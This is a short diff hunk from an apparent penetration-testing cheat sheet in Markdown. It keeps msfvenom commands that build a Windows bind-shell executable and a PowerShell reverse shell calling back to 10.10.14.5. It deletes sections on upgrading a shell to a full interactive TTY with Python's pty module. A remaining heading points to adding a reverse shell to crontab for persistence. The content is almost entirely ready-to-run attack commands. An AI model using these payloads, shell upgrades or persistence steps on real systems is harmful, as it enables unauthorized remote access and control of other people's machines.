@@ -365,19 +365,7 @@ msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe > bind.exe
 msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shell.ps1
 ```
 
-## Upgrade shell to TTY using Python
 
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-
-## Create fully interactive TTY shell
-
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-stty raw -echo; fg
-export TERM=xterm
-```
 
 ## Add reverse shell to crontab for persistence
 
